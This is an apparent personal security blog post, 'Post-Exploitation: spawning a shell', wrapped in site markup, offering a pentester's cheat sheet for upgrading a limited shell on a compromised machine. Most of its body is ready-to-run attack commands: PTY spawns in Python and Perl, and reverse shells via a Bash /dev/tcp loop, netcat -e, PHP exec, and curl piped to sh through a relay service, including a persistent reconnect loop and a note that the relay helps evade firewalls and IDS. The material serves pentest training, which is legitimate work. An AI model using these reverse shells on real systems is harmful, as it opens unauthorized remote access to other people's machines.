<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.11.2 by Michael Rose
  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Post-Exploitation: spawning a shell · L1Cafe</title>
<meta name="description" content="Once you have gained shell access on a machine, you will often find the promptextremely limited, especially if you have used manual exploitation. In thesecases, the shell often cannot perform basic tasks that you would expect from afully interactive shell prompt like Bash, or zsh. You will also be unable to runintensive interactive commands such as the Vim text editor, or ncurses-basedprograms.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="L1Cafe">
<meta property="og:title" content="Post-Exploitation: spawning a shell">
<meta property="og:url" content="https://l1cafe.blog/2018/12/05/post-exploitation-spawning-shell">


  <meta property="og:description" content="Once you have gained shell access on a machine, you will often find the promptextremely limited, especially if you have used manual exploitation. In thesecases, the shell often cannot perform basic tasks that you would expect from afully interactive shell prompt like Bash, or zsh. You will also be unable to runintensive interactive commands such as the Vim text editor, or ncurses-basedprograms.">



  <meta property="og:image" content="https://l1cafe.blog/assets/images/2018-12-05-post-exploitation-spawning-shell/header.jpg">



  <meta name="twitter:site" content="@L1Cafe">
  <meta name="twitter:title" content="Post-Exploitation: spawning a shell">
  <meta name="twitter:description" content="Once you have gained shell access on a machine, you will often find the promptextremely limited, especially if you have used manual exploitation. In thesecases, the shell often cannot perform basic tasks that you would expect from afully interactive shell prompt like Bash, or zsh. You will also be unable to runintensive interactive commands such as the Vim text editor, or ncurses-basedprograms.">
  <meta name="twitter:url" content="https://l1cafe.blog/2018/12/05/post-exploitation-spawning-shell">

  
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://l1cafe.blog/assets/images/2018-12-05-post-exploitation-spawning-shell/header.jpg">
  

  



  <meta property="article:published_time" content="2018-12-05T00:00:00+01:00">






<link rel="canonical" href="https://l1cafe.blog/2018/12/05/post-exploitation-spawning-shell">





  <script type="application/ld+json">
    {
      "@context": "http://schema.org",
      "@type": "Organization",
      "url": "https://L1Cafe.blog",
      "logo": "https://l1cafe.blog/assets/images/logo-bordered.png"
    }
  </script>



  <script type="application/ld+json">
    {
      "@context": "http://schema.org",
      "@type": "Person",
      "name": "León Castillejos",
      "url": "https://L1Cafe.blog",
      "sameAs": ["https://twitter.com/L1Cafe","https://www.linkedin.com/in/l1cafe","https://github.com/L1Cafe","https://gitlab.com/L1Cafe","https://soundcloud.com/l1cafe","https://keybase.io/l1cafe"]
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="L1Cafe Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if lte IE 9]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->


    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    <div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        <a class="site-title" href="/">L1Cafe</a>
        <ul class="visible-links">
          
            
            <li class="masthead__menu-item">
              <a href="https://L1Cafe.blog/about/" >About me</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="https://L1Cafe.blog/projects/" >My projects</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="https://L1Cafe.blog/bookmarks/" >Bookmarks</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="https://L1Cafe.blog/tags/" >Tags</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="https://L1Cafe.blog/categories/" >Categories</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="https://L1Cafe.blog/year-archive/" >Posts</a>
            </li>
          
        </ul>
        
        <button class="search__toggle" type="button">
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle Menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>

    <div class="initial-content">
      
  











<div class="page__hero"
  style=" "
>
  
    <img src="/assets/images/2018-12-05-post-exploitation-spawning-shell/header.jpg" alt="Post-Exploitation: spawning a shell" class="page__hero-image">
  
  
    <span class="page__hero-caption">Photo credit: <a href="https://unsplash.com"><strong>Unsplash</strong></a>
</span>
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="http://schema.org/Person">

  
    <div class="author__avatar">
      

      
        
        <a href="https://L1Cafe.blog">
          <img src="/assets/images/avatar.jpg" alt="León Castillejos" itemprop="image">
        </a>
      
    </div>
  

  <div class="author__content">
    
      <a href="https://L1Cafe.blog"><h3 class="author__name" itemprop="name">León Castillejos</h3></a>
    
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Details</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">European Union</span>
        </li>
      

      

      
        <li>
          <a href="mailto:L1Cafe-github@tuta.io">
            <meta itemprop="email" content="L1Cafe-github@tuta.io" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      
        <li>
          <a href="https://keybase.io/l1cafe" itemprop="sameAs">
            <i class="fas fa-fw fa-key" aria-hidden="true"></i> Keybase
          </a>
        </li>
      

      
        <li>
          <a href="https://twitter.com/L1Cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/l1cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/L1Cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      
        <li>
          <a href="https://gitlab.com/L1Cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-gitlab" aria-hidden="true"></i> GitLab
          </a>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://soundcloud.com/l1cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-soundcloud" aria-hidden="true"></i> SoundCloud
          </a>
        </li>
      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
    <meta itemprop="headline" content="Post-Exploitation: spawning a shell">
    <meta itemprop="description" content="Once you have gained shell access on a machine, you will often find the promptextremely limited, especially if you have used manual exploitation. In thesecases, the shell often cannot perform basic tasks that you would expect from afully interactive shell prompt like Bash, or zsh. You will also be unable to runintensive interactive commands such as the Vim text editor, or ncurses-basedprograms.">
    <meta itemprop="datePublished" content="December 05, 2018">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Post-Exploitation: spawning a shell
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  3 minute read
</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p>Once you have gained shell access on a machine, you will often find the prompt
extremely limited, especially if you have used manual exploitation. In these
cases, the shell often cannot perform basic tasks that you would expect from a
fully interactive shell prompt like Bash, or zsh. You will also be unable to run
intensive interactive commands such as the Vim text editor, or ncurses-based
programs.</p>

<p>In those situations, if the system is reasonably standard, you will be able to
quickly get a complete shell prompt by invoking a shell of your liking. I
generally try to spawn Bash, because it’s shipped by default in most Linux and
some Unix systems (like macOS). Bash is reasonably powerful, complete, and well
documented. Bash also has additional features, like job control and
tab-completion that will only make your life that much easier as a pentester.</p>

<p>These are my favourite snippets, decreasing to the least favourites (or
difficult to remember).</p>

<h1 id="python">Python</h1>

<p>Lots of Linux distributions will ship with Python by default. It’s also very
easy to read, but being a relatively modern programming language, very outdated
servers might not have it installed.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
</code></pre></div></div>

<p>If Python is available, but Bash isn’t installed, you can also try to spawn
the Bourne Shell (sh), which is included in even more Unices, but it’s a bit
less feature-packed:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/sh")'
</code></pre></div></div>

<h1 id="perl">Perl</h1>

<p>If Python is not available, Perl might be. It is much older than Python, and
although it’s not very popular anymore, it used to be widely known in Linux
sysadmin circles, and soon would become the programming language of choice for
system administrators.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ perl —e 'exec "/bin/sh";'
</code></pre></div></div>

<p>(As with Python, you can also try Bash).</p>

<h1 id="spawning-a-shell-directly">Spawning a shell directly</h1>

<p>The system you’re in might not have Python or Perl, but that doesn’t mean you
won’t get a shell. You can try simply calling the shell directly from your
session:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ /bin/sh -i
</code></pre></div></div>

<h1 id="reverse-shells">Reverse shells</h1>

<p>You can also try to have the victim machine connect back to your computer for a
fully functional Bash shell.</p>

<p>All the following examples require you to have Netcat installed on the
attacker’s computer. Then, you can run the following:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -l -p 8080 -vvv
</code></pre></div></div>

<p>This opens port 8080. Keep in mind the victim machine needs to be able to reach
your computer directly. So if you’re in the same LAN, this trick will work, but
it will definitely not work behind a NAT without some port-forwarding. <code class="highlighter-rouge">-vvv</code> is
for added verbosity.</p>

<p>Once the Netcat socket is listening on the attacking machine, we can try the
following snippets on the victim:</p>

<h2 id="bash-magic">Bash magic</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ exec 5&lt;&gt;/dev/tcp/&lt;YOUR_REACHABLE_IP_HERE&gt;/8080
$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
</code></pre></div></div>

<p>This very helpful <a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/">trick</a>
will come in handy especially when the victim’s computer does not have Netcat
installed but Bash is present.</p>

<h2 id="netcat">Netcat</h2>

<p>Netcat is almost never present on production systems. But it’s yet another
option, and it’s easy to remember too.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -e /bin/sh &lt;YOUR_REACHABLE_IP_HERE&gt; 8888
</code></pre></div></div>

<h2 id="php-with-bash">PHP with Bash</h2>

<p>If the victim is running PHP, chances are high the system has PHP installed as
well. In that case, you can try to make the PHP server run the following line.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YOUR_REACHABLE_IP_HERE&gt;/8080 0&gt;&amp;1'"</span><span class="p">);</span> <span class="cp">?&gt;</span>
</code></pre></div></div>

<h2 id="curl-with-shellnowsh">Curl with shell.now.sh</h2>

<p><a href="https://github.com/lukechilds/reverse-shell">shell.now.sh</a> is a free service
that can help you pivot connections. Being a third party, it might stop working
eventually, but because it is an HTTPS connection, it has better chances of
evading corporate firewalls or even IDSs.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl https://shell.now.sh/&lt;YOUR_REACHABLE_IP_HERE&gt;:8080 | sh
</code></pre></div></div>

<p>If you run an invalid command, the shell will exit. To avoid this, you can force
it to keep reconnecting, but this will leave the machine exposed after you
finish pentesting it unless you kill the process or reboot the machine.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ while true; do curl https://shell.now.sh/&lt;YOUR_REACHABLE_IP_HERE&gt;:8080 | sh; done
</code></pre></div></div>

<h3 id="php-with-shellnowsh">PHP with shell.now.sh</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;? php exec("curl https://shell.now.sh/&lt;YOUR_REACHABLE_IP_HERE&gt;:8080 | sh"); ?&gt;
</code></pre></div></div>

<h1 id="sources">Sources</h1>

<p>In no particular order:</p>
<ul>
  <li><a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/">https://www.gnucitizen.org/blog/reverse-shell-with-bash/</a></li>
  <li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
  <li><a href="https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97">https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97</a></li>
  <li><a href="https://netsec.ws/?p=337">https://netsec.ws/?p=337</a></li>
  <li><a href="https://github.com/lukechilds/reverse-shell">https://github.com/lukechilds/reverse-shell</a></li>
  <li><a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">https://gist.github.com/rshipp/eee36684db07d234c1cc</a></li>
  <li><a href="https://gist.github.com/roy4801/ad7146e3a0da80a922ca1dde0afd17b0">https://gist.github.com/roy4801/ad7146e3a0da80a922ca1dde0afd17b0</a></li>
</ul>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#hacking" class="page__taxonomy-item" rel="tag">hacking</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#tip" class="page__taxonomy-item" rel="tag">tip</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#cybersecurity" class="page__taxonomy-item" rel="tag">Cybersecurity</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-12-05T00:00:00+01:00">December 05, 2018</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/2018/10/12/apple-t2-security" class="pagination--pager" title="What Apple’s T2 chip means for the security of Macs
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-10-12-apple-t2-security/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/10/12/apple-t2-security" rel="permalink">What Apple’s T2 chip means for the security of Macs
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  4 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">An article by Mac Rumors was recently published, revealing Apple had designed a component, which, according to an Apple document, would “result in an inopera...</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-09-11-msfvenom/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/09/11/msfvenom" rel="permalink">MSFVenom and Meterpreter: The basics
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  3 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the Devel machine in Hack The Box.

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-08-30-proxmox-vnc/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/08/30/proxmox-vnc" rel="permalink">Proxmox tip: “Failed to start VNC server: Failed to bind socket: Cannot assign requested address”
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  2 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">Note: This issue appears on Proxmox 5.2-x, always check the date of the post when troubleshooting your systems.

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-06-14-defeat-spammers/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/06/14/defeat-spammers" rel="permalink">The DEFINITIVE guide to defeating spammers
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  6 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">Nowadays, spamming is a very common technique, and nobody can deny that. Spamming is so cheap that even a 10% opening rate is a tremendous success, because s...</p>
  </article>
</div>
        
      </div>
    </div>
  
  
</div>
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
    <div id="results" class="results"></div></div>
      </div>
    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    
    
      <li><a href="https://twitter.com/L1Cafe"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
    
    
    
      <li><a href="https://github.com/L1Cafe"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
    
    
      <li><a href="https://gitlab.com/L1Cafe"><i class="fab fa-fw fa-gitlab" aria-hidden="true"></i> Gitlab</a></li>
    
    
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2018 L1Cafe.

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.0.13/js/all.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    (function ($) {
    var $comments = $('.js-comments');

    $('#new_comment').submit(function () {
      var form = this;

      $(form).addClass('disabled');
      $('#comment-form-submit').html('<i class="fas fa-spinner fa-spin fa-fw"></i> Loading...');

      $.ajax({
        type: $(this).attr('method'),
        url: $(this).attr('action'),
        data: $(this).serialize(),
        contentType: 'application/x-www-form-urlencoded',
        success: function (data) {
          $('#comment-form-submit').html('Submitted');
          $('.page__comments-form .js-notice').removeClass('notice--danger');
          $('.page__comments-form .js-notice').addClass('notice--success');
          showAlert('Thanks for your comment! It will show on the site once it has been approved.');
        },
        error: function (err) {
          console.log(err);
          $('#comment-form-submit').html('Submit Comment');
          $('.page__comments-form .js-notice').removeClass('notice--success');
          $('.page__comments-form .js-notice').addClass('notice--danger');
          showAlert('Sorry, there was an error with your submission. Please make sure all required fields have been completed and try again.');
          $(form).removeClass('disabled');
        }
      });

      return false;
    });

    function showAlert(message) {
      $('.page__comments-form .js-notice').removeClass('hidden');
      $('.page__comments-form .js-notice-text').html(message);
    }
  })(jQuery);
  </script>

  



  </body>
</html>